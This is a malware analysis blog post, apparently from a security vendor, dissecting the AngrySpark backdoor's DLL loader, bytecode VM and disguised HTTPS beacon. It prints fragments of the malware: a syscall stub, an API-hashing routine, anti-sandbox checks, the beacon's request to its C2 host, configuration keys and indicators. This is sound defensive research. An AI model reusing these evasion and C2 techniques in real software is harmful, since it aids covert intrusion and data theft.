---
schema_version: "1.0.0"
document_id: "aca57aa5bb08f3c1f5223f918fe32d265e8d47cdd1f88c42197ed53cf8909e50"
company_key: "gen-digital-inc-common-stock"
company: "Gen Digital Inc."
source_id: "gen-digital-inc-common-stock-rss-b2c253ea0afd"
canonical_url: "https://www.gendigital.com/blog/insights/research/chasing-an-angry-spark"
published_at: "2026-04-14T18:31:02+00:00"
first_seen_at: "2026-07-20T03:32:39.128259+00:00"
fetched_at: "2026-07-28T21:56:44.009033+00:00"
content_hash: "sha256:558d0585da751af0505d839feaab9c9a9f111b320408717a1fb4813cee1efe37"
---

# Chasing an Angry Spark

In the spring of 2022, our anti-rootkit engine flagged something unusual inside a svchost.exe process on a machine in the United Kingdom. A chunk of memory -roughly 32 kilobytes- was making direct NtQuerySystemInformation syscalls, bypassing every usermode hook we had in place. When we pulled the memory dump and opened it in a disassembler, we found not just shellcode, but an entire virtual machine: a custom bytecode interpreter running a 25-kilobyte program, decoding its own payload on the fly, resolving APIs through hash lookups, and checking for hypervisors before executing a single line of its real code.


We named it AngrySpark -after the C++ namespace angry_spark found in the RTTI metadata of the DLL that delivered it. Over the following year, we captured three memory snapshots from the same host, watched its C2 infrastructure evolve, and eventually saw the connection get blocked. Then it vanished. No new samples. No new infrastructure. No second victim. Just a single spark in the dark.


This is the story of how we took it apart.


## Why AngrySpark matters


Most backdoors pick a lane. AngrySpark built three of them. The DLL, the VM, and the beacon each carry their own encryption, their own API resolution, and their own C2 channel. Compromise one layer and the other two remain opaque.


That architecture is what elevates it from a well-built backdoor to something worth writing up. The payload is assembled from bytecode at runtime, so the operator can swap out the final-stage binary, change the API set, add anti-analysis checks, or rotate C2 URLs by pushing a new 25KB blob. The 6.5KB loader never changes. It behaves more like a deployment framework than a conventional dropper.


The other reason it matters is the mismatch between effort and scope. The engineering is serious: a VM-based deployment framework, dual encrypted C2 channels, CET-aware anti-analysis, runtime code patching, and direct syscalls with a 24-build compatibility table. Yet it appeared on a single machine in the United Kingdom, ran for about a year, and disappeared when its infrastructure expired.


No public malware repository carried the DLL during its operational life, and no other vendor published on it. That does not make AngrySpark more important than broader campaigns, but it does make it unusually revealing. It looks like high-effort malware deployed with a very limited visible footprint.


## The architecture at a glance


AngrySpark operates as a three-stage system. A DLL masquerading as a Windows component loads via the Task Scheduler, decrypts its configuration from the registry, and injects position-independent shellcode into svchost.exe. That shellcode implements a virtual machine. The VM processes a 25KB blob of bytecode instructions, decoding and assembling the real payload -- a beacon that profiles the machine, phones home over HTTPS disguised as PNG image requests, and can receive encrypted shellcode for execution.


Each stage is designed to be independently replaceable. The VM's bytecode format means the operator can swap out the payload, change the configuration, rotate C2 URLs, or add new anti-analysis checks -- all without modifying a single byte of the loader code.


**Stage** **Role** **Key idea**


Stage 0, DLL loader Masquerades as a Windows Task Scheduler extension, decrypts config from the registry, and injects shellcode into svchost.exe A quiet entry point with persistence, configuration handling, and self-removal logic


Stage 1, VM loader Runs a custom bytecode interpreter that assembles the real payload at runtime The operator can change behavior by updating the blob rather than the loader


Stage 2, beacon Profiles the host, communicates over HTTPS disguised as PNG image requests, and can execute encrypted shellcode from the server A full C2 channel built to blend in and stay adaptable


### Stage 0, the DLL loader


The entry point is a 200KB DLL named WptsExtensions.dll, the exact name of a legitimate Windows Task Scheduler extension library. It exports the same five functions (WptsCopyActionData, WptsCreateAction, WptsDestroyAction, WptsFreeActionData, WptsLaunchAction) and spoofs its version info as "Microsoft Corporation, v10.0.19041.1023".


After loading its configuration, the DLL injects the VM shellcode into a svchost.exe service host process. The injected code is entirely position-independent. It carries its own API resolver, its own exception handler, and its own syscall dispatcher. No imports, no relocations, no PE headers.


### Stage 1, the virtual machine


The VM loader is a ~6.5KB position-independent shellcode that implements a bytecode interpreter. It reads instructions sequentially from a 25KB configuration blob, dispatching each to a handler function. The blob contains approximately 190 entries (VM instructions) encoded in a custom format.


The May 2022 variant has 23 entries (syscall tables). Between May and June 2022, the operator added a single entry: build 20344, a Windows 10 Insider preview from the Iron/Cobalt development cycle -- the branch that became Windows 11. The June and January variants are identical (24 entries, table at 0x13A2).


This tells us two things. First, the operator was actively maintaining the syscall table and testing against Insider builds during May-June 2022. Second, they stopped updating after that. Builds above 22000 (Win11 22H2, 23H2) are not covered, and the entry-point guard rejects them outright. The shellcode was frozen sometime in mid-2022.


### Stage 2, the beacon


The assembled payload is a 27KB position-independent shellcode with 74 functions. It implements a full C2 beacon with system profiling, encrypted communication, and remote code execution.


The beacon disguises its check-in as a request for a PNG image:


The encrypted shellcode is decrypted with the second XXTEA key from the configuration, then executed in freshly allocated memory. After execution, the results are XXTEA-encrypted and sent back via HTTP POST to a separate .php endpoint.


## Stealth, anti-analysis, and self-removal


AngrySpark is not only modular, it is also careful about how it appears to defenders. Several design choices look specifically aimed at frustrating clustering, bypassing instrumentation, and limiting the forensic residue left behind.


The binary's PE metadata has been deliberately altered to confuse toolchain fingerprinting.


### Notable defensive friction points


- The PE timestamp is falsified, and the Rich header was modified after compilation in a way that breaks straightforward toolchain fingerprinting.
- The shellcode uses direct syscalls to get around usermode API hooks.
- The VM includes hypervisor checks and CET or Shadow Stack aware anti-analysis logic.
- The DLL pins the C2 server's TLS certificate fingerprint, rejecting connections to anything that does not match the expected infrastructure. If someone sinkholed the domain or stood up a proxy with a different certificate, the DLL would refuse to talk.
- The loader can remove itself if contact goes stale or if the server explicitly tells it to do so.


The heartbeat serves a second purpose: it is a dead man's switch. On each beacon cycle, the DLL compares the current time against the stored heartbeat. If the difference exceeds a configurable threshold (stored as a day count in the config blob, multiplied by 864000000000 -- one day in 100-nanosecond FILETIME intervals), the DLL enters its self-destruct sequence: it wipes the encrypted registry blob via RegDeleteValue, then schedules its own DLL file for deletion on the next reboot using MoveFileExW with the MOVEFILE_DELAY_UNTIL_REBOOT flag. Before that, it impersonates itself with SeSecurityPrivilege, SeRestorePrivilege, and SeTakeOwnershipPrivilege, moves the DLL to a temp directory, and restricts its permissions.


There is a second trigger. If the C2 server responds with HTTP 200 (rather than the expected 302 redirect that delivers encrypted commands), the DLL treats this as a server-side kill command. It runs the same cleanup: wipe registry, schedule file deletion, exit. The normal operating response is a 302 redirect whose Location header provides the URL for the encrypted payload exchange.


In other words: a 200 means "acknowledged, self-destruct," and a 302 means "here are your orders." No contact at all for too long also means self-destruct. The operator built the backdoor to vanish automatically if it lost its handler -- which is exactly what happened in April 2023.


## Command and control design, and how the operation evolved


AngrySpark uses two separate C2 channels, each with its own domain, IP address, and encryption layer.


The two C2 channels don't share anything except a hosting provider. AES-256-CBC + RSA-4096 on one side, XXTEA + custom Base64 + PNG steganography on the other. Different encryption, different protocols, different domains, different IPs, all within the same 185.151.28.0/22 range. The custom Base64 alphabet rotates with each configuration update, so there's no fixed encoding to write a signature against.


Each configuration update carried new randomized URL paths, though the domain and C2 structure remained consistent:


The pattern is clear: random 6-8 character slug, incrementing 4-digit counter, random filename. Combined with a custom Base64 alphabet that also rotates per update, this defeats static network signatures while maintaining a recognizable structure for the operator.


**Point in time** **What changed**


May 2022 May 2022: The first variant uses NtQuerySystemInformation(40) (SystemCodeIntegrityInformation). The shellcode prologue differs from later versions. Syscall table has 23 entries, no Insider builds.


June 2022 June 2022: Rewritten loader with a different code structure but identical C2 domain. URL paths rotated. Syscall table gains one entry: build 20344 (Win10 Insider Fe/Co), bumping it to 24 entries. The operator was actively updating both code and compatibility data.


January 2023 January 2023: Same code as June 2022 (identical syscall table), but the NtQuerySystemInformation argument changed to class 10 (SystemModuleInformation) and URLs rotated again. The code was frozen; only the configuration blob changed.


April to June 2023 By April 2023, the C2 connection was blocked. By May, the beacon domain expired. By June, the DLL's C2 certificate expired. The infrastructure was never renewed.


The timeline suggests active maintenance in mid-2022, followed by a freeze in the shellcode and continued rotation only in the configuration and network paths. Then the infrastructure stopped being renewed. That sequence matters because it makes the disappearance look operational, not accidental.


## What we still do not know


Yet it appeared on a single machine in the United Kingdom, ran for about a year, and disappeared when its infrastructure expired. The DLL never surfaced in any public malware archive. No other vendor has published on it.


Was it a targeted operation that achieved its objective and was burned? A test deployment that was abandoned? A contractor's proof of concept? We don't know.


What we do know is that somewhere in the RTTI metadata of a tampered DLL, someone chose the namespace angry_spark and the exception class sombrely_exception. And populated it with nine C++ classes: BCryptSymmetricKey, BCryptAsymmetricKey, BCryptKey, crypto_exception, connection_exception, wininet_exception, angry_spark_exception, bad_config_exception, and -- curiously -- sombrely_exception. They built a virtual machine to deploy their payload, wrapped it in three layers of encryption, hid their commands inside PNG images, and then -- quietly, sombrely -- let it all expire.


The spark went out. But the code remains.


For readers who want the deeper reverse engineering detail, the appendix below preserves the underlying technical observations, tables, and selected code fragments from the working draft in a more reference-oriented format.


## Technical Appendix


### Appendix A. Detailed Stage 0 notes


The DLL was never uploaded to VirusTotal. It remained invisible to the public threat intelligence ecosystem for the entirety of its operational life.


The DLL stores its encrypted configuration in the Windows registry under a path that itself is encrypted.


A heartbeat timestamp (FILETIME) at bytes 0-7 of the registry value is updated after each successful beacon, allowing the operator to track the last check-in time.


**Claimed tool (comp.id)** **Build number** **Build actually from**


VS2017 15.0-15.3 (259-261) 26715 VS2017 15.9


VS2017 15.0-15.3 (259-261) 27905 VS2019 16.5


VS2015 RTM-U3 (255-258) 28105 VS2019 16.7


**Field** **Value**


C2 URL https://s13035516.server-sys.com/?b=2113411937&d=


Asymmetric key RSA-4096 public key (PEM)


Beacon interval 300 seconds


Retry count 10


Jitter 90 seconds


HTTP library WinINet


### Appendix B. Detailed Stage 1 notes


The VM loader is a ~6.5KB position-independent shellcode that implements a bytecode interpreter. It reads instructions sequentially from a 25KB configuration blob, dispatching each to a handler function. The blob contains approximately 190 entries encoded in a custom format:


The VM implements 22 distinct opcodes -- a complete deployment toolkit:


A typical blob is processed in phases:


Every string, API name, DLL name, and code chunk in the blob is encoded with a cascading XOR cipher. The format is deceptively simple:


` \[total_length: 1 byte\]\[data: N bytes\]\[checksum1: 1 byte\]\[checksum2: 1 byte\]`


The two checksum bytes double as XOR keys. Decoding works backwards through the data, using separate key chains for even and odd byte positions. After decoding, the original checksums are recomputed using seeds 0x23 and 0xA5 and verified against the saved keys. If either mismatches, the entry is rejected.


The maximum decoded payload is 253 bytes (limited by the single-byte length field). This is why the 27KB payload requires 93 separate DECODE_COPY instructions.


The VM resolves all APIs by walking the Process Environment Block (PEB), iterating loaded modules, and comparing DJB2 hashes of export names:


` hash = 5381`
` for byte in name:`
` hash = (hash * 33 + byte) & 0xFFFFFFFF`


Two variants exist: one for UNICODE_STRING (with case folding via | 0x20), used to find DLLs by name, and one for ASCII byte strings, used to match export table entries.


**Category** **Opcodes** **What they do**


Memory management ALLOC, FREE, ZERO, INIT_STATE VirtualAlloc a 53KB buffer, set region permissions, zero-fill sections


Data loading DECODE_COPY (x93 entries!) XOR-decode 93 data chunks and write them to the allocated buffer


Relocations RELOCATION Fix up 10 QWORD pointers by adding the allocated base address


API resolution LOAD_DLL, RESOLVE_API XOR-decode DLL/API names, resolve via GetModuleHandle + GetProcAddress


Execution CALL_VOID, CALL_RETURN Invoke functions in the assembled payload


Configuration CONFIG_KV Write 16 key-value pairs (C2 URLs, crypto keys, base64 alphabet)


Integrity INTEGRITY (x15 entries) DJB2 hash checks on critical blob regions


Anti-analysis ANTI_ANALYSIS, SET_FLAGS Hypervisor + CET/Shadow Stack detection, selective debug traps


Infrastructure SETUP_TRAMPOLINE, INIT_EXCEPT, EXCEPT_DATA Build API call stubs, initialize exception handling, patch code


Control VERSION, TERMINATOR Validate blob version (0x0303), end interpretation


**Hash** **Target**


0x22D3B5ED ntdll.dll


0x7040EE75 KERNEL32.dll


0xA721952B KERNELBASE.dll


0xFF6C2F6E msvcrt.dll


0xA1CBA7D3 RtlVirtualUnwind


0xFA44C769 RtlLookupFunctionEntry


To bypass usermode API hooks, the loader includes a syscall instruction wrapper with a hardcoded build-number-to-syscall-number table:


We extracted and compared the syscall table from all three memory dumps. The tables are almost identical, with one revealing difference:


` mov r10, \[rsp+38h\] ; table entry pointer`
` movzx eax, word ptr \[r10+2\] ; syscall number`
` mov r10, rcx ; first argument`
` syscall`
` ret`


**Build** **OS Version** **May 2022** **Jun 2022** **Jan 2023**


3790 Server 2003 SP2 0x20 0x20 0x20


6000-6002 Vista RTM-SP2 0x20 0x20 0x20


7600-7601 Windows 7 / SP1 0x20 0x20 0x20


9200 Windows 8 0x21 0x21 0x21


9600 Windows 8.1 0x22 0x22 0x22


10240-19044 Win10 1507-21H2 0x23 0x23 0x23


20344 Win10 Insider (Fe/Co) -- 0x23 0x23


22000 Win11 21H2 0x23 0x23 0x23


The May 2022 variant has 23 entries (table at offset 0x1312). Between May and June 2022, the operator added a single entry: build 20344, a Windows 10 Insider preview from the Iron/Cobalt development cycle -- the branch that became Windows 11. The June and January variants are identical (24 entries, table at 0x13A2).


The VM scans msvcrt.dll's code sections for a specific 12-byte x64 instruction pattern:


` 48 8D 15 XX XX XX XX lea rdx, \[rip + offset\] ; string ptr`
` 48 8B C8 mov rcx, rax`
` FF 15 YY YY YY YY call \[rip + offset\] ; indirect call`


When a match is found, the VM XOR-decodes a target string, compares it against the data at the lea target, and if it matches, captures the indirect call target -- provided it points into KERNELBASE.dll or KERNEL32.dll. This hijacks specific CRT internal function pointers for exception dispatch, allowing the loader to intercept control flow without modifying the exception handler chain.


Before any payload code runs, the VM applies several checks:


The RDSSPQ instruction reads the Shadow Stack Pointer. Intel's Control-flow Enforcement Technology (CET) is primarily found in instrumented environments and certain hypervisors, so a non-zero SSP is a strong signal that the code is running under analysis or in a hardened VM.


During our emulation of the VM bytecode, three instruction types initially defied classification:


Type 21 is the anti-sandbox kill switch. The 4-byte parameter controls it: when set to 0, the VM checks for a hypervisor (via CPUID) and a non-zero Shadow Stack Pointer (via the RDSSPQ instruction). If both are detected on Windows 10 version 2004 or later, the entire loader aborts with error code 0xAACFBB1A. This is a targeted anti-sandbox technique -- most analysis environments running recent Windows versions with hardware-assisted security features would trigger this check.


**Blob Type** **Raw Byte** **Resolution**


Type 0 0x01 Allocate Memory -- VirtualAlloc the 53KB execution buffer


Type 17 0x12 Exception Handler Data -- stores pointer to XOR-encoded API name block used during exception setup


Type 21 0x16 Anti-Analysis -- conditional abort if hypervisor present + CET Shadow Stack active + OS ≥ Win10 2004


### Appendix C. Detailed Stage 2, infrastructure, and configuration notes


Nine data collectors run in sequence, each appending results to a session packet:


The process enumeration has a fallback chain. It first tries the Toolhelp API (CreateToolhelp32Snapshot, Process32FirstW/Process32NextW). If that fails, it falls back to NtQuerySystemInformation with information class 5 (SystemProcessInformation), walking the linked list of SYSTEM_PROCESS_INFORMATION structures. Each process name is hashed with MD5 (via the CryptoAPI), and the hash is added to the session packet.


Collected data flows through a multi-stage encryption pipeline before transmission:


The XXTEA implementation uses the standard 32-round Feistel structure with a 128-bit key derived from the configuration. The custom Base64 alphabet changes with each configuration update, which defeats signature-based network detection without adding any complexity to the protocol.


The beacon disguises its check-in as a request for a PNG image:


` GET /assets/static/img/I4o8Pp_41.png HTTP/1.1`
` Host: pick.storewebzone.net`
` User-Agent: wininet/10.0.19044`
` Cache-Control: no-cache`
` Connection: Keep-Alive`


The server's response contains actual PNG data, but with a custom chunk type. The payload scans for the magic byte 0xA1 followed by a 24-byte header:


The payload uses a packet protocol with 22 entry types for serializing collected data:


Each entry is prefixed with a type byte and length, forming a TLV (Type-Length-Value) structure that the C2 server parses to reconstruct the victim's profile.


The parent domain server-sys.com was registered in June 2021 through Tucows with WHOIS privacy protection. Several related subdomains (ss1., api., bs.) were observed on the same IP, suggesting purpose-built infrastructure.


Both IPs fall within the same 185.151.28.0/22 range, suggesting the operator rented multiple VPS instances from the same UK-based hosting provider.


The VM writes 16 configuration key-value pairs into the payload's data segment:


Two distinct XXTEA keys serve different purposes: key #1 encrypts outbound data (system profiles), while key #2 decrypts inbound payloads (shellcode from the server). This separation means compromising one key doesn't expose the other direction of communication.


Three memory snapshots, each captured months apart, tell the story of a living operation:


May 2022: The first variant uses NtQuerySystemInformation(40) (SystemCodeIntegrityInformation). The shellcode prologue differs from later versions. Syscall table has 23 entries, no Insider builds.


June 2022: Rewritten loader with a different code structure but identical C2 domain. URL paths rotated. Syscall table gains one entry: build 20344 (Win10 Insider Fe/Co), bumping it to 24 entries. The operator was actively updating both code and compatibility data.


January 2023: Same code as June 2022 (identical syscall table), but the NtQuerySystemInformation argument changed to class 10 (SystemModuleInformation) and URLs rotated again. The code was frozen; only the configuration blob changed.


By April 2023, the C2 connection was blocked. By May, the beacon domain expired. By June, the DLL's C2 certificate expired. The infrastructure was never renewed.


**#** **Collector** **What it gathers**


0 OS Info RtlGetVersion -- build number, service pack, product type


1 Module Path GetModuleFileNameW -- path of the host process


2 Integrity Level OpenProcessToken + GetTokenInformation -- SID sub-authority


3 Process List Two methods: CreateToolhelp32Snapshot and NtQuerySystemInformation


4 ATP Status Registry check: SOFTWARE\\Microsoft\\Windows Advanced Threat Protection\\Status


5 Hypervisor CPUID leaf 1 -- checks hypervisor present bit


6 Security Product Attempts to load ctiuser.dll (CrowdStrike Falcon indicator) + GetProductInfo


7 Version Resource FindResourceA / LoadResource -- extracts PE version info


8 CET Support CPUID leaf 7 -- Intel CET / Shadow Stack capability


**Type** **Description**


0x01 Start session


0x02 OS version string


0x04 Module path (wide string)


0x06 Session ID / campaign ID


0x09 Integrity level


0x0A Process name hash (MD5)


0x0B Process list separator


0x0D ATP onboarding status


0x11 Hypervisor flag


0x13 Security product flag


0x14 CET support flag


0x16 End session


**Property** **Value**


Domain s13035516.server-sys.com


IP 185.151.31.6


ASN AS48254 (20i Limited, UK)


TLS Wildcard *.server-sys.com (Sectigo, issued 2022-06-30)


Protocol HTTPS GET with RSA-4096 encrypted responses


**Property** **Value**


Domain pick.storewebzone.net


IP 185.151.31.111


ASN AS48254 (20i Limited, UK)


TLS pick.storewebzone.net (Sectigo, issued 2021-05-10, expired 2022-05-10)


Protocol HTTPS GET/POST with XXTEA encryption


**Date** **Beacon URL** **C2 Endpoint**


May 2022 /assets/static/img/dDCFQM_03.png /prod/myAVDAnA/5466/irC6Zn_8FCd.php


Jun 2022 /assets/static/img/agSAKp_03.png /prod/KhzbPFTj/6515/gbLJ8y_Ac7e.php


Jan 2023 /assets/static/img/I4o8Pp_41.png /prod/vUcLWuZF/8363/asb2dz_1dd4.php


**Key** **Name** **Sample value**


0x01 Crypto key #1 cc32c78022525f12f5f407f0e1291003 (XXTEA)


0x02 Campaign ID pkZe


0x03 Beacon URL https://pick.storewebzone.net/assets/static/img/I4o8Pp_41.png


0x04 User-Agent wininet/10.0.19044


0x05 HTTP headers Host: pick.storewebzone.net\\r\\nCache-Control: no-cache\\r\\n...


0x2A HTTPS flag 1


0x2B Keep-alive 1


0x2C Connection mode 2


0x30 Retry count 1


0x90 C2 URL https://pick.storewebzone.net/prod/vUcLWuZF/8363/asb2dz_1dd4.php


0x91 C2 enabled 1


0x92 Crypto key #2 44a77bc78986f910d98491c0006b7be5 (XXTEA)


0x93 Buffer size 1024


0x95 Base64 alphabet EHnAWr8G2qi7CuOXk6gs0MI5yfUBLpY1v4hzFTdlDtKaQb_9jScwVexZoJPm3N-R


### Appendix D. Indicators


The full list of indicators is available in our GitHub repository. Key indicators are listed below.


##### File Indicators


**Type** **Hash**


DLL (SHA256) 491870264FA2D666FB8859508A6A44B80BCB868E2F43C00F03199DF2651C757D


DLL (MD5) 592D663AD71575E4C52E0C810008C3C2


ImpHash 068AB3CB0F28916EA64C27EA58A680C8


Memory dump #1 9C492A39823AA0FF14F3131A2346F833827A1C423E77DCC9682BB939AEA0E215


Memory dump #2 20F19A37E17772C38B6F89AF40FA941D55BAD9FFCF3B3382206A0CADFA937025


Memory dump #3 96883ABD45ECA3F076F1D5E2A9E75E37B588A37A99FE42EC4BEDD34F7926760E


##### Network Indicators


**Type** **Value**


C2 domain (DLL) s13035516.server-sys.com


C2 domain (shellcode) pick.storewebzone.net


C2 IP #1 185.151.31.6


C2 IP #2 185.151.31.111


ASN 48254 (20i Limited, UK)


User-Agent wininet/10.0.19044


Beacon URL pattern /assets/static/img/<6-8 chars>_<NN>.png


C2 URL pattern /prod/<8 chars>/<4 digits>/<6-8 chars>.php


Parent domain server-sys.com (Tucows, privacy-protected, Canada)


Parent domain storewebzone.net (Name.com)


##### Host Indicators


**Type** **Value**


DLL name WptsExtensions.dll


Registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\CompatibilityAdapter


Injected process svchost.exe -k netsvcs -p


C++ namespace angry_spark::


Blob version 0x0303


XOR checksum seeds 0x23, 0xA5


DJB2 parameters init=5381, mul=33
